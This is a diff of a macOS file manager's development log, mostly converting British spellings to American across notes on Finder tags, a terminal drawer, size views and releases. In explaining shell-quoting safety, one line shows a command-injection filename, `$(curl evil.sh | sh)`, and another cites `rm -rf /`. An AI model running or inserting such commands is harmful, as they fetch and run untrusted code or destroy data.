+  `FileCellView`'s text field nor the Git letter's `accentColor`. Two judgment calls: a **colorless
   tag draws a hollow ring** where Finder draws nothing — Finder can afford that because its dots sit
-  beside the name, so absence reads as "no colour", whereas in a column of its own it would read
+  beside the name, so absence reads as "no color", whereas in a column of its own it would read
   "untagged", a lie about a file the user did tag; and on the cursor's emphasized row every dot is
-  **ringed in the selection's text colour**, or a blue tag vanishes into blue.
+  **ringed in the selection's text color**, or a blue tag vanishes into blue.
 - **`PanelViewController+TagEditing.swift`** — ⌃T (free; ⌘T is New Tab, and ⌃D/⌃Q are where this app's
   popups already live) drops a menu over the cursor row: stock seven + names in use, `.on`/`.mixed`
   per how many targets carry each, toggle across the selection, New Tag…, Remove All Tags. Targets are
   filtered **per entry** (`.local`), not per pane — which is what lets tagging work from a search
-  results tab, and makes a mixed selection tag what it can. **The menu offers a colour only when
-  *introducing* a name**, per pass 3's finding that colour belongs to the name system-wide: offering
-  per-file colour would be offering an edit macOS silently reverts.
+  results tab, and makes a mixed selection tag what it can. **The menu offers a color only when
+  *introducing* a name**, per pass 3's finding that color belongs to the name system-wide: offering
+  per-file color would be offering an edit macOS silently reverts.
 - **Search chips** — an `NSTokenField` (a tag *is* a token; it rounds each name into a deletable chip
   and completes against `knownTagNames`). Read via **`stringValue`, not `objectValue`**: the latter
   holds only *tokenized* chips, so a tag typed without a trailing comma would not merely be dropped
@@ -2851,13 +2897,13 @@ table is a renderer; the model is the truth.*
 were tagged by **Apple's own writer** (`URLResourceValues.tagNames`, available on this macOS 26 box
 though not on Dirnex's 14 floor) and our writes were read back through **Apple's own getter**, which
 saw exactly what we wrote. Confirmed: every dot case (stock, multi, 3-dot cap from five, hollow ring
-for a colourless `Quokka`, nothing for untagged, white ring on the cursor row); a tag added from the
-menu landing on disk as `Green\n2` with **`kMDItemFSLabel = 2`** — the last-*coloured*-tag-wins rule
+for a colorless `Quokka`, nothing for untagged, white ring on the cursor row); a tag added from the
+menu landing on disk as `Green\n2` with **`kMDItemFSLabel = 2`** — the last-*colored*-tag-wins rule
 pass 3 documented, maintained by our hand-written label; a purple `Milestone` across a 6-file marked
 set **preserving the existing `Quokka\n0` verbatim** (the exact data loss `tagNames` would have
 caused, which is why the core writes by hand); the mixed `−` state; completion offering a custom name
 learned by browsing; the chip narrowing `mdfind` to the one file carrying `Urgent`; **dots in the
-results panel and ⌃T working there**; the column vanishing inside a zip with ⌃T greyed out; the
+results panel and ⌃T working there**; the column vanishing inside a zip with ⌃T grayed out; the
 toggle taking both panes live; and **both gutters coexisting in the Dirnex repo itself** (Name │ `M`/`!`
 │ dots │ Size │ Date). The layout invariant was checked in the persisted store, not by eye: after
 repeated toggles and tab switches Name stayed **exactly 279.5** and no `tags` entry ever entered a
@@ -2872,7 +2918,7 @@ context menu the app had never had. Both done, VERIFIED LIVE.
 
 **The column is gone; the dots ride at the right edge of the name.** This is the better design and the
 user was right to ask for it, but note what it retires: the whole preference question pass 4 agonized
-over (contextual vs always-on vs a toggle) was an artefact of the dots *being a column* — a column
+over (contextual vs always-on vs a toggle) was an artifact of the dots *being a column* — a column
 must be present or absent for the whole pane, so it had to be blank for non-taggers or jitter. Inside
 the name cell the question dissolves: an untagged row draws nothing and gives its name the full width,
 so tags cost exactly the rows that have them. `showTags` survives as a plain on/off (the dots are
@@ -2881,7 +2927,7 @@ but the elaborate justification is gone with the column. **Pass 4's generalizati
 column machinery went with it** — it existed only to host a second gutter, so `+ContextualColumns` was
 deleted and `+Git`/`+Columns` restored verbatim from 42e88f2. A generalization with one client is just
 a longer way to write the client. **The Git gutter keeps its column and should**: it is *text*,
-competing for the name field's colour with the mark's red and the hidden-file dim, and F2 swaps that
+competing for the name field's color with the mark's red and the hidden-file dim, and F2 swaps that
 field for an editor — none of which applies to a view that draws its own dots.
 - **`TagDotsView`** (was `TagCellView`) — an `NSView` inside `FileCellView`, right-aligned, sized by
   `intrinsicContentSize` so Auto Layout hands the name whatever the dots don't need. The name's
@@ -2895,11 +2941,11 @@ field for an editor — none of which applies to a view that draws its own dots.
   out behind it to the right — the same last-wins precedence the core found in the legacy label byte),
   and they **overlap by ~two thirds**, so five tags stay a compact cluster. The thin gap between dots
   is punched with `.destinationOut` on the view's **own layer** (hence `wantsLayer`): it erases only
-  our dots, so the row's real background shows through — a stroke in a fixed colour cannot work,
+  our dots, so the row's real background shows through — a stroke in a fixed color cannot work,
   because the background is alternating-or-blue and not ours to know.
 - **The context menu** (`PanelViewController+ContextMenu`) — the app had none at all. Built from
   `CommandCatalog` via `MainMenuBuilder.commandItem` (made internal), so a right-click item and its
-  menu-bar twin cannot drift; nil targets mean `validateMenuItem` greys them out for free (Paste with
+  menu-bar twin cannot drift; nil targets mean `validateMenuItem` grays them out for free (Paste with
   an empty clipboard, everything mutating inside an archive). Two menus: one over an entry, one over
   the empty space (folder-scoped: New Folder, Paste, Add to Favorites, Synchronize). **Tags is a
   submenu**, rebuilt on open via `NSMenuDelegate` and sharing ⌃T's item builder (`tagMenuItems`) so
@@ -2916,9 +2962,9 @@ field for an editor — none of which applies to a view that draws its own dots.
 
 **VERIFIED LIVE:** dots identical to Finder's for 1/2/5-tag files (`report.pdf` [Red, Blue] → whole
 blue leading, red sliver behind, exactly like the probe's `two.txt`); a long name truncating with an
-ellipsis before its dots; untagged rows drawing nothing; the hollow ring for colourless `Quokka`;
+ellipsis before its dots; untagged rows drawing nothing; the hollow ring for colorless `Quokka`;
 adding Green from the right-click **submenu** and watching it become the new lead dot; the entry menu,
-the background menu, Paste correctly greyed; right-click inside the marked set keeping all 7; and
+the background menu, Paste correctly grayed; right-click inside the marked set keeping all 7; and
 right-click outside it collapsing to the clicked row with **every red mark cleared**. 588 core + 33
 app tests, swiftformat + swiftlint-strict clean, artifacts removed.
 **NEXT (M6 pass 6):** the terminal drawer, or size-visualization mode — the next two `[ ]` items.
@@ -2933,21 +2979,21 @@ results tab titled with the tag. Sections now read Searches / Favorites / Volume
 two stored properties an extension cannot hold (`showsAllTags`, `renderedTagNames`) landed there, and
 `rebuild()` had to widen to internal (Swift `private` doesn't cross files — the recurring gotcha).
 - **`FinderTagColor.displayOrder` (core, +2 tests → 590).** The section needed the order Finder
-  *shows* (Red, Orange, Yellow, Green, Blue, Purple, Grey); `allCases` is raw-value order, which is
-  Apple's storage indices — it opens on Grey and buries Red. The core had already documented the
+  *shows* (Red, Orange, Yellow, Green, Blue, Purple, Gray); `allCases` is raw-value order, which is
+  Apple's storage indices — it opens on Gray and buries Red. The core had already documented the
   distinction in prose and an existing test even spelled the display order out as a **local literal**
   to assert the indices aren't it; that literal is now the property, so the test pins the real thing.
   `FinderTag.systemTags` (the stock seven, in that order) is the list both the sidebar and ⌃T offer.
-- **The ⌃T menu was listing them Grey-first**, while its own comment claimed "that is the order Finder
+- **The ⌃T menu was listing them Gray-first**, while its own comment claimed "that is the order Finder
   lists them" — false since pass 4, and invisible because nobody reads a menu's order as a bug. Now
   shares `FinderTag.systemTags`, so the comment is true and the two surfaces agree.
-- **The provider learns *colours*, not just names.** `knownTagNames: Set<String>` became a private
+- **The provider learns *colors*, not just names.** `knownTagNames: Set<String>` became a private
   `[String: FinderTag]` keyed by the lowercased name — which is the shape of the truth the core
-  established (a colour belongs to the *name*, system-wide; Finder keeps exactly such a database), so
+  established (a color belongs to the *name*, system-wide; Finder keeps exactly such a database), so
   the latest sighting wins. Without it every custom tag in the sidebar would draw as a hollow ring;
   with it, live, `Zebra` came out purple. `knownTagNames` survives as a computed property (the search
   sheet's chip completion still wants names), and the stock seven are seeded and **never overwritten**
-  by a sighting — a file carrying a malformed colourless `Red` (a shape the core found in the wild)
+  by a sighting — a file carrying a malformed colorless `Red` (a shape the core found in the wild)
   must not repaint the sidebar's Red.
 - **"All Tags…" appears only when there is something behind it.** Finder can always offer it because
   it knows every tag you own; we know the ones we have *seen* (no public API — the system's list is
@@ -3014,7 +3060,7 @@ Everything below was **probed against the real thing before any Swift was writte
   browsing ``$(curl evil.sh | sh)``) and it lands on the command line of an interactive shell.
   POSIX single quotes have no escapes, so only the quote itself needs the classic `'` → `'\''`
   bridge; **`fish` is the exception and the reason `ShellKind` distinguishes it** — its single quotes
-  *do* honour backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
+  *do* honor backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
   **`^U^K` before the command is a safety measure, not tidiness**: the line editor may hold a
   half-typed command, and appending `cd …` to it would execute *their* words plus ours — someone who
   typed `rm -rf /` and thought better of it would watch us run `rm -rf / cd -- '/x'`. Both keys are
@@ -3115,7 +3161,7 @@ by what the probe said:
   own popups live on (⌃T/⌃D/⌃Q) — every one of those letters is the shell's (⌃D is EOF, ⌃Q is XON),
   and the drawer is the one surface whose keystrokes belong to somebody else. No stand-aside code
   was needed: a focused terminal leaves **no pane in the responder chain**, so the pane commands
-  find no target and disable themselves — *visible in the live Go menu, entirely greyed* — and their
+  find no target and disable themselves — *visible in the live Go menu, entirely grayed* — and their
   keys fall through. ⌃D really did reach the shell as EOF. The one place that needed a hand was the
   window's Esc monitor, which would have eaten `vim`'s entire modal interface to close a preview.
 - **`ExternalTerminalLauncher`** — `ExternalDiffLauncher` verbatim over the pure model; `Open in
@@ -3134,7 +3180,7 @@ symlink** (pane stayed on `/tmp`, one `cd`, no second); `isAtPrompt` **typed not
 `sleep 15` held the foreground**, and nothing retroactively after; `exit` closed the drawer and the
 next ⌃` gave a clean screen and a fresh shell **in the active pane's directory**; and ⌘Q left **no
 orphaned shell**. GOTCHAS: (1) **a notification banner (`UserNotificationCenter`) taking front makes
-Dirnex's window non-key, which greys out *every* pane menu item and swallows ⌘L** — this looked
+Dirnex's window non-key, which grays out *every* pane menu item and swallows ⌘L** — this looked
 exactly like a focus bug I had introduced, and I nearly "fixed" a non-bug; re-tested with the banner
 gone, clicking a pane row takes focus back correctly. Verify twice before believing a UI symptom.
 (2) The drawer's first open was a **four-line sliver** — AppKit gives an item with no saved geometry
@@ -3146,7 +3192,7 @@ open/closed state persist via `NSSplitView` autosave, so a drawer left open reop
 FOLLOW-UP (user, same day): the prompt sat flush against the drawer's left border. SwiftTerm draws
 column zero against its own bounds and has **no padding API**, so the view is inset 6 pt and the
 container paints the strip — asking the *terminal* for `nativeBackgroundColor` rather than copying a
-colour, since that background moves twice (Dark Mode via `textBackgroundColor`, and OSC 11).
+color, since that background moves twice (Dark Mode via `textBackgroundColor`, and OSC 11).
 FOLLOW-UP (user, same day): **the drawer beeped on every pane switch** — "like pressing a
 non-existent shortcut", which is exactly what it was: `NSSound.beep()`, reached the long way round.
 `ShellCommandLine`'s `^U^K` opens the follow-`cd`, and **`bash` binds `^U` to readline's
@@ -3218,7 +3264,7 @@ design:
   bytes in 4 KB block round-up (ratio 0.513); conversely one **64 MB sparse LMDB file** in
   `DirnexCore/.build` allocates only 27 MB, pulling that whole tree to 1.082. So the choice matters
   and is not cosmetic. It goes to logical anyway because **the bar must agree with the number
-  rendered beside it**: a row whose bar is twice its neighbour's while its own size column reads
+  rendered beside it**: a row whose bar is twice its neighbor's while its own size column reads
   smaller is incoherent. ncdu can default to disk usage because it is a disk-usage tool *with no
   size column*; Dirnex is a file manager with one, already showing `FileEntry.byteSize`. Payoff: the
   mode reuses `DirectorySizer` exactly, with no second byte source.
@@ -3293,7 +3339,7 @@ The cache was driven against a **real filesystem change**: growing `.../a/b/file
 moved 1050 → 9050 — while the **sibling survived and was still correct**. GOTCHA (harness-only, but
 instructive): the probe **segfaulted on its first run**, in a program containing no unsafe code —
 `String(format: "%s", swiftString)`. `%s` expects a C string, and handing it a Swift `String` is
-undefined behaviour; `%@` or manual padding is the fix.
+undefined behavior; `%@` or manual padding is the fix.
 **NEXT (M6 pass 10, the app layer):** the panel toggle and the bar column drawn at **continuous
 width** with the minimum-ink rule; a `DirectorySizeProvider` owning the cache (off-main walks via
 `DirectoryLoader.size`, serialized, streamed in and seeded in bulk through `setDirectorySizes`,
@@ -3410,7 +3456,7 @@ obvious implementation would have got wrong:
   mirroring `tagMenuItems` — an `NSMenuItem` lives in one menu at a time, so items are the shareable
   unit, not menus). All three gate on `handoffTargets` = the marked set, else the cursor, filtered to
   `.local` — the line `tagTargets` already draws, so it works from a results tab (virtual pane, real
-  local hits) and greys inside an archive / on SFTP, which have no URL to hand over.
+  local hits) and grays inside an archive / on SFTP, which have no URL to hand over.
 - **Services** is the smallest piece and the one with a real trap: `NSApp.servicesMenu` is
   **single-valued**, so Services lives in the app menu (where macOS puts it) and is *not* duplicated
   into the right-click — a second copy would take the population away from the first rather than
@@ -3438,7 +3484,7 @@ rule on screen; `weird.zzzqqq` showed **"No Applications" + Other…**; the righ
 With ▸ / Share… / Services ▸; **Services listed real file services** (Show in Finder, Show Info in
 Finder, Parallels' Open/Reveal in Windows), proving the requestor is being asked; **TextEdit actually
 opened `notes.txt`** showing its real content; the **Share sheet** came up reading "notes · Text
-Document · 18 bytes" with AirDrop/Mail/Messages (nothing was sent); and both commands **greyed out
+Document · 18 bytes" with AirDrop/Mail/Messages (nothing was sent); and both commands **grayed out
 inside a zip**. **NEXT (M6 pass 12):** the automation slice M6's exit criteria actually name —
 AppleScript/Shortcuts verbs (reveal, copy, run-op) + user shell scripts receiving the selection as
 argv/env, surfaced in the palette and F-key bar — then the iCloud sync-status column, which closes
@@ -3549,7 +3595,7 @@ used. No core change (pass 12's 724 tests stand; +1 catalog test for the new com
   under the cyclomatic-complexity limit, like its siblings).
 - **Palette dispatch** (`CommandPaletteController`): `reload` joins `CommandCatalog.all` with
   `UserScriptStore.load().paletteCommands` (read fresh each open, so a just-created script is
-  searchable immediately); `runSelected` recognises a `userScript.*` id (`UserScript.name(fromCommandID:)`)
+  searchable immediately); `runSelected` recognizes a `userScript.*` id (`UserScript.name(fromCommandID:)`)
   and routes it to `runUserScript(_:)` via a synthetic `representedObject`-carrying `NSMenuItem`,
   everything else keeps the static `CommandBinding.selector` path. A new `file.manageScripts` catalog
   command (+ `CommandBinding` + File menu) makes the organizer reachable from the menu bar and palette.
@@ -3617,7 +3663,7 @@ proven end-to-end. Core-first as always; one new core file, five app touch-point
   controller **re-focuses the active pane** (`focusedPanel.focusTable()`) **then** dispatches to nil —
   which both puts the pane back in the responder chain *and* matches TC, where a function-button click
   acts on the active pane and leaves focus there. GOTCHA for the live tester: a click that has to pass
-  *through* a modal (cancelling a conflict sheet in the same batch) gets swallowed mid-animation — it
+  *through* a modal (canceling a conflict sheet in the same batch) gets swallowed mid-animation — it
   reads as an intermittent button, but a deliberate single click is 100% reliable (proven by the log).
 - **`FunctionBarView.swift`** — a `FunctionBarButton` (borderless, self-drawn: dim monospaced key token
   + primary caption, hover/press fills, a leading hairline on all but the first, `refusesFirstResponder`
@@ -3652,9 +3698,9 @@ under the sidebar** — it moved out of the window-wide container and into the *
 **second** item (the sidebar is the first and now stays full height beside it, exactly as the terminal
 drawer already did). The queue bar stays full-width in the container below. (2) **Background is the
 sidebar's vibrant material, not a flat fill** — the earlier `windowBackgroundColor` came out RGB(30,30,30),
-a near-black neutral grey that read as "black"; the app's actual dark-*blue* is the sidebar's vibrancy, so
+a near-black neutral gray that read as "black"; the app's actual dark-*blue* is the sidebar's vibrancy, so
 the bar now hosts an `NSVisualEffectView` with material **`.sidebar`** (probed live: `.windowBackground`
-renders a flat grey, `.sidebar` carries the blue tint) behind the buttons, with an `NSBox` top hairline.
+renders a flat gray, `.sidebar` carries the blue tint) behind the buttons, with an `NSBox` top hairline.
 (3) **Buttons are rounded chips filling the height** — self-drawn `NSBezierPath(roundedRect:)` per state
 (rest 0.07 / hover 0.14 / press 0.22 `labelColor` alpha, radius 6), the hairline separators dropped, a
 `fillEqually` stack with 5 pt gaps and a 3 pt vertical inset, bar height 28→**32**. GOTCHA (recurring):
@@ -3776,7 +3822,7 @@ diff classification, hence `CloudSyncStatus` throughout.
 
 App (+8 → **68**): `CloudSyncStatusProvider` (`FinderTagProvider`'s twin — off-main, per-directory,
 LRU-cached, debounced, published by notification) + `SyncBadgeView`/`SyncBadgeStyle` (SF Symbols,
-system colours; the quiet states are `secondaryLabel` because a placeholder is *not* a problem) +
+system colors; the quiet states are `secondaryLabel` because a placeholder is *not* a problem) +
 `PanelViewController+SyncStatus` + app-wide `AppPreferences.showSyncStatus` (default **on**) with a
 `view.toggleSyncStatus` command, View-menu checkmark, ⌘K palette entry and Settings ▸ Panels toggle.
 **THE design call that makes it free: the directory gate.** Tags have to look at every row to find
@@ -3802,18 +3848,18 @@ the same-file extension that already holds Workspace/Window/Application) rather 
 comments as pass 14 had to.
 
 Found in passing, **not fixed** (it is the tags feature, not this one): **iCloud rewrites a tag's
-stored colour.** Writing `Red\n6` to a file in iCloud Drive and reading it back seconds later yields
+stored color.** Writing `Red\n6` to a file in iCloud Drive and reading it back seconds later yields
 `Red\n1` — reproducible, twice, while the identical write to a local file keeps `6`. Finder still
-draws the dot red (it looks the colour up by *name*, as the pass-3 core notes it does), and Dirnex
-draws the stored colour → grey. So tag colours may be wrong on every tagged file in iCloud Drive.
+draws the dot red (it looks the color up by *name*, as the pass-3 core notes it does), and Dirnex
+draws the stored color → gray. So tag colors may be wrong on every tagged file in iCloud Drive.
 Whether Finder's own tagging UI produces the same stored state is **untested** — the AppleScript
 `label index` path writes only the legacy Finder-info byte, not `_kMDItemUserTags`, so it could not
-answer the question. Worth a pass of its own: the provider already keeps the name → colour map
+answer the question. Worth a pass of its own: the provider already keeps the name → color map
 (`known`) that a fix would consult. → **Answered and fixed in pass 17 below: Finder's own UI does it
 too, so it was every tagged file in iCloud Drive.**
 
-Progress (2026-07-17, M6 pass 17 — the iCloud tag-colour bug from pass 16; **fixed, VERIFIED LIVE
-side by side with Finder**): tag dots now take a colour from the tag's **name**, the way Finder does,
+Progress (2026-07-17, M6 pass 17 — the iCloud tag-color bug from pass 16; **fixed, VERIFIED LIVE
+side by side with Finder**): tag dots now take a color from the tag's **name**, the way Finder does,
 instead of from the byte the file stores.
 
 **The probe answered pass 16's open question, and the answer was the bad one.** Tagging a file in
@@ -3821,13 +3867,13 @@ iCloud Drive **with Finder's own right-click ▸ Tags UI** stores `Red\n1`, not 
 not after a sync delay. So this was never about hand-written attributes: it is **every tagged file in
 a user's iCloud Drive**. Three more things the probe established, each of which killed a cheaper fix:
 
-- **The rewrite is colour-blind and name-blind.** Blue lands as `Blue\n1`; a custom purple `Zebra`
-  lands as `Zebra\n1`. Every tag, whatever it is, ends up at colour **1**. Off iCloud the same writes
-  keep their colour indefinitely (`Red\n6`, `Zebra\n3`).
+- **The rewrite is color-blind and name-blind.** Blue lands as `Blue\n1`; a custom purple `Zebra`
+  lands as `Zebra\n1`. Every tag, whatever it is, ends up at color **1**. Off iCloud the same writes
+  keep their color indefinitely (`Red\n6`, `Zebra\n3`).
 - **There is no second opinion on the file.** The legacy `com.apple.FinderInfo` label byte is
-  normalised to 1 too (read `…09 02 …` on all three probe files), so the pre-tags byte the core
-  already knows how to read cannot rescue the colour.
-- **Finder's own name → colour database is not readable.** It is not in `com.apple.finder`'s plist
+  normalized to 1 too (read `…09 02 …` on all three probe files), so the pre-tags byte the core
+  already knows how to read cannot rescue the color.
+- **Finder's own name → color database is not readable.** It is not in `com.apple.finder`'s plist
   (`FavoriteTagNames` is just the stock seven); the `TagsCloudSerialNumber` key there hints at a
   private synced store, and a custom `Zebra` appears nowhere under `~/Library`. This confirms the
   pass-3 decision to accumulate sightings rather than depend on Finder's list — there is nothing to
@@ -3843,26 +3889,26 @@ drawing**, deliberately not folding it into the snapshot — `FinderTagSnapshot`
 the files say*, which is exactly what its hand-rolled `==` compares to decide a repaint.
 
 **A second instance of the same bug, found while fixing the first — and this one wrote to disk.**
-`PanelViewController+TagEditing.offeredTags` preferred "the spelling **and colour** the files
-themselves carry over the learned one", so the ⌃T menu drew Red's swatch grey for an iCloud target.
+`PanelViewController+TagEditing.offeredTags` preferred "the spelling **and color** the files
+themselves carry over the learned one", so the ⌃T menu drew Red's swatch gray for an iCloud target.
 Worse: that same `FinderTag` is the item's `representedObject`, i.e. the tag `toggleTag` **writes** —
 so tagging an iCloud file and a local file Red together wrote `Red\n1` to the *local* file, where the
-byte is not normalised and simply persists. The same leak arrives by plain copy: a tagged file copied
+byte is not normalized and simply persists. The same leak arrives by plain copy: a tagged file copied
 **out** of iCloud Drive lands locally carrying `Red\n1` forever. Resolving by name fixes the swatch,
 the write, and the copied-out file's dot. Note the old comment was already at odds with the pass-3
-core doc's own "a colour belongs to the NAME, system-wide, not to the file".
+core doc's own "a color belongs to the NAME, system-wide, not to the file".
 
-**THE judgement call: a grey sighting never displaces a colour already known** (`FinderTagIndex.learn`).
-Grey is what iCloud normalises *to*, so it is the one reading indistinguishable from the provider
-having eaten the real colour — and without the guard the fix would have **caused a regression**: a
-custom `Zebra` seen purple on the Desktop and grey in iCloud Drive would land on whichever folder was
-browsed last, flipping the Desktop's currently-correct dot to grey. Cost: genuinely recolouring a tag
-*to* grey isn't picked up until relaunch (which reseeds from the first sighting). Stock tags never
-reach this path — `learn` refuses them outright. Known edge, left alone: learning a colour does not
+**THE judgment call: a gray sighting never displaces a color already known** (`FinderTagIndex.learn`).
+Gray is what iCloud normalizes *to*, so it is the one reading indistinguishable from the provider
+having eaten the real color — and without the guard the fix would have **caused a regression**: a
+custom `Zebra` seen purple on the Desktop and gray in iCloud Drive would land on whichever folder was
+browsed last, flipping the Desktop's currently-correct dot to gray. Cost: genuinely recoloring a tag
+*to* gray isn't picked up until relaunch (which reseeds from the first sighting). Stock tags never
+reach this path — `learn` refuses them outright. Known edge, left alone: learning a color does not
 repaint a folder already scanned, so a custom tag's dot updates on that folder's next scan.
 
-LIVE (both panes on screen, next to Finder): an iCloud folder whose **every** file stores colour 1
-read blue / red / red correctly; a custom `Zebra` showed grey until the Desktop was scanned, then
+LIVE (both panes on screen, next to Finder): an iCloud folder whose **every** file stores color 1
+read blue / red / red correctly; a custom `Zebra` showed gray until the Desktop was scanned, then
 turned **purple** on the iCloud file while the Desktop's stayed purple — the guard holding. ⌃T on an
 iCloud target offered Red with a red swatch and a checkmark, Zebra in purple; toggling Red across a
 mangled `Red\n1` file and a local one wrote **`Red\n6`** to disk; a file copied out of iCloud drew
@@ -4063,8 +4109,8 @@ denied→`.denied` **guarded by `getuid() != 0`** since root ignores permission 
 **THE macOS-26 deep-link finding (live-probed, not recalled):** *both*
 `com.apple.preference.security?Privacy_AllFilesAccess` **and**
 `com.apple.settings.PrivacySecurity.extension?Privacy_AllFilesAccess` land on the Privacy & Security
-**overview**, not the FDA sub-list — Tahoe stopped honouring the anchor into the specific pane. FDA is
-one *labelled* click away, so I kept the canonical constant and wrote the copy to match ("switch on
+**overview**, not the FDA sub-list — Tahoe stopped honoring the anchor into the specific pane. FDA is
+one *labeled* click away, so I kept the canonical constant and wrote the copy to match ("switch on
 Dirnex **under** Full Disk Access"). **THE test-host gotcha:** the app test host launches the real
 delegate, so `presentIfNeeded` fired **during `xcodebuild test`** and flipped the shared-defaults
 latch (that is why the latch read `1` before I ever launched by hand); guarded with
@@ -4080,7 +4126,7 @@ degradation). 812 core + 79 app green, swiftlint `--strict` 0 violations, swiftf
 synthetic-keys quirk the pass-13 ⌘K note records — but it uses the identical `enableEscapeToCancel`
 helper every other Dirnex sheet does.)
 
-**Follow-up fix (2026-07-17, live-probed):** the "Tahoe stopped honouring the anchor" conclusion
+**Follow-up fix (2026-07-17, live-probed):** the "Tahoe stopped honoring the anchor" conclusion
 above was wrong — the anchor *name* was. Asking System Settings itself
 (`name of anchors of pane "Privacy & Security"` via AppleScript) shows the pane has **no**
 `Privacy_AllFilesAccess` anchor; the real one is **`Privacy_AllFiles`**, and an unknown anchor
@@ -4165,7 +4211,7 @@ thread** at the app layer (the disk read already is), **not** by making the sort
 **CI gating (the "XCTest metrics gated in CI" line, done as Swift-Testing budget tests).** New
 `PerformanceBudgetTests` measures best-of-N wall-clock on a seeded 100k dirty listing and **enforces
 budgets only in release** (`#if !DEBUG` — a debug `swift test` prints its numbers but compiles the
-`#expect`s out, since unoptimised Swift is 3–5× slower and would false-fail). A new CI step runs
+`#expect`s out, since unoptimized Swift is 3–5× slower and would false-fail). A new CI step runs
 `swift test -c release --filter PerformanceBudget`. Gates: **filter keystroke (steady) < 16 ms** and
 **(cold) < 32 ms** — both pass with margin; **100k model build < 1500 ms** as a *regression ceiling*
 (catches an accidental O(n²)/per-entry-bridging blow-up; not the 150 ms target, which is off-main).
@@ -4202,7 +4248,7 @@ This pass does that for every path that builds a pane's `DirectoryModel`. Core�
   `Panel` gained `setModel(_:)` — the off-main twin of `setListing`: it installs an already-sorted
   model and does **only** the cheap cursor/selection reconciliation (same refresh-vs-navigation
   decision by path, now factored into a shared `reconcile`), never a re-sort. **Second, a
-  behaviour-preserving optimisation with its own payoff:** `setDirectorySize`/`setDirectorySizes` now
+  behavior-preserving optimization with its own payoff:** `setDirectorySize`/`setDirectorySizes` now
   re-sort **only when `sort.key == .size`** (`resortIfOrderDependsOnSize`) — under a name/date/ext sort
   the totals feed the size column and selection math but never the row order, so re-running the 350 ms
   sort was pure waste. That waste was real: size-visualization streams totals in ~ten a second, each of
@@ -4254,7 +4300,7 @@ beside it — the two now run as one sequence on a fresh install.
   `FunctionBar.defaultSlots` move: a screen names its actions by `CommandCatalog` id, so the app
   resolves each to the command's title and its *effective* shortcut through the user's `KeyBindings`
   — the tour prints exactly what the menu/⌘K palette print and can never advertise a key the app no
-  longer honours.** Five screens: Welcome (dual-pane, no chip) · the command palette (`view.
+  longer honors.** Five screens: Welcome (dual-pane, no chip) · the command palette (`view.
   commandPalette`) · file ops (`file.copy/move/newFolder/trash`) · navigation (`go.editLocation`,
   `file.newTab`, `go.favorites`) · You're-ready (`app.fullDiskAccess`). +7 tour tests pin length ≤ 5,
   well-formedness, unique ids, that **every highlighted id resolves to a real catalog command**, that
@@ -4400,7 +4446,7 @@ publishes the **DMG to the per-tag release** (stable `--latest`, beta `--prerele
 "Latest" always points at stable), and re-uploads the merged appcast to the `appcast` release
 (`--clobber`, drafts skip the live feed). **`SUFeedURL` moved** from `releases/latest/download/…` to
 `releases/download/appcast/appcast.xml` (the stable feed URL). **Migration gotcha (documented in
-RELEASING.md): builds ≤ v0.0.3 still poll the old `latest/…` URL, so the first channelled release
+RELEASING.md): builds ≤ v0.0.3 still poll the old `latest/…` URL, so the first channeled release
 must be installed manually once** — the design accepted this ("no external users on the old feed
 yet").
 
@@ -4452,7 +4498,7 @@ a Sparkle-free stand-in for `SPUUserUpdateChoice`) is a value type whose transit
 **dismiss keeps the badge** (the user postponed; that is precisely what the ambient signal is for),
 while **skip and install clear it** (Sparkle will not raise a skipped version again on its own, and
 an install is about to relaunch into it). 11 tests pin that, plus the blank/whitespace version
-normalisation that keeps the tooltip from reading "Dirnex  is available". The app half is adapter
+normalization that keeps the tooltip from reading "Dirnex  is available". The app half is adapter
 only: `AppUpdater` gained `didFindValidUpdate` / `updaterDidNotFindUpdate` /
 `userDidMake:forUpdate:state:`, each a one-line assignment into an `availability` property whose
 `didSet` posts `AppUpdater.availabilityDidChange`; `BrowserWindowController+Updates` mirrors it.
@@ -4486,7 +4532,7 @@ instruments.
 trademark rights, plus a patent grant with a retaliation clause. Under MIT the name question is
 merely unaddressed — the reader has to know trademark law applies independently. Apache states it in
 the license the forker is already reading. `LICENSE` is the canonical text **verbatim** (sha256
-`cfc7749b…`, only the appendix copyright line filled in) so GitHub's licence detector recognises it
+`cfc7749b…`, only the appendix copyright line filled in) so GitHub's license detector recognizes it
 and nobody has to diff it against upstream to trust it.
 
 **The icon needs a separate carve-out, because §6 does not reach it.** §6 is about *trademarks* — it
@@ -4602,7 +4648,7 @@ App: `DirectorySizeRule` (`.everything` / `.gitAware(snapshot)`) makes "filtered
 what is ignored" unrepresentable, and rides through the provider's queue, which is now scope-keyed
 end to end (`queue`, `order`, `inFlight`). Space-on-dir obeys the same rule, so one size column never
 mixes two kinds of number. Per-tab toggle (View ▸ Exclude Git-Ignored from Sizes, palette, no
-shortcut), greyed outside a repository, with the status line saying **"sizes exclude Git-ignored"**
+shortcut), grayed outside a repository, with the status line saying **"sizes exclude Git-ignored"**
 whenever it is in force. `DirectorySizeProvider` watches `GitStatusProvider`'s notification and
 invalidates git-aware totals **only when `ignoredPaths` moved** — that provider republishes on every
 debounced read, so hanging invalidation on it would re-walk the tree on every ⌘S.
@@ -4611,7 +4657,7 @@ debounced read, so hanging invalidation on it would re-walk the tree on every �
 
 1. **`DirectorySizer.size` now takes two closures, and a bare trailing closure binds to `excluding`,
    not `isCancelled`.** That silently reverses what every pre-existing call meant; it failed loudly
-   here only because the two have different arities. Every call site is labelled now, and the doc
+   here only because the two have different arities. Every call site is labeled now, and the doc
    comment says why.
 2. **A landed total could be erased between its walk and its publish.** The publish used to say
    "something changed, go re-read the cache" — but any pane's FSEvents watcher invalidates every
@@ -4712,7 +4758,7 @@ silence). Menu title is now set in `validateMenuItem` — AppKit's only hook for
 live state — while the **palette keeps the generic catalog title, which is what its fuzzy search
 matches against**. `AppPreferences.diffToolIdentifier` ("" = automatic) with an Operations-tab
 picker whose footer names the installed tools, and covers the case that needs it most: none
-installed, where the command greys out with no explanation. Shortcut **⌥F3**, the sibling of F3
+installed, where the command grays out with no explanation. Shortcut **⌥F3**, the sibling of F3
 "View" — F3 looks at the file under the cursor, ⌥F3 looks at it *against* the other pane's — checked
 conflict-free under **both** presets (the TC preset claims bare F3 for Quick Look).
 
@@ -4823,7 +4869,7 @@ to reorder at all. It retires when the drag slice lands, not before.
   button** (Searches and Servers hold a handful of rows, Favorites opens with eight, and eight
   always-visible trash buttons put a row of hazards over the folders reached for most), and **no
